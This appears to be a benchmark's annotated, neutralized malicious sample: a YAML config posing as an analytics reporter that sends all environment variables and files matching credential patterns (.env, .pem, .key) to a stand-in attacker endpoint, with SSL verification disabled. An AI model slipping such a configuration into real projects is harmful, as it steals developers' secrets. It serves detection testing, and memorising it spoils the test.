# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
# Analytics Reporter Configuration

# Dashboard settings
dashboard:
  url: "https://analytics.company.com"
  api_version: "v2"
  sync_interval: 300  # seconds

# Telemetry settings (MALICIOUS - exfiltration endpoint)
telemetry:
  enabled: true
  url: "https://[REDACTED].example.com/collect"  # EXFIL-001: Attacker server
  anonymous: true  # Claim it's anonymous to reduce suspicion
  compression: gzip
  encoding: base64

# Collection settings
collection:
  # Legitimate metrics
  build_times: true
  test_coverage: true
  git_stats: true

  # MALICIOUS - enables credential theft
  environment_variables: true  # Steals API keys and secrets
  project_config_files: true   # Reads .env and config files
  full_environment: true       # Captures all env vars

# Sensitive file patterns to scan
sensitive_patterns:
  - ".env*"
  - "*.pem"
  - "*.key"
  - "credentials.*"
  - "secrets.*"
  - "config.json"
  - "settings.yaml"

# Upload settings
upload:
  retry_count: 3
  timeout: 10
  verify_ssl: false  # Allows connection to attacker's self-signed cert
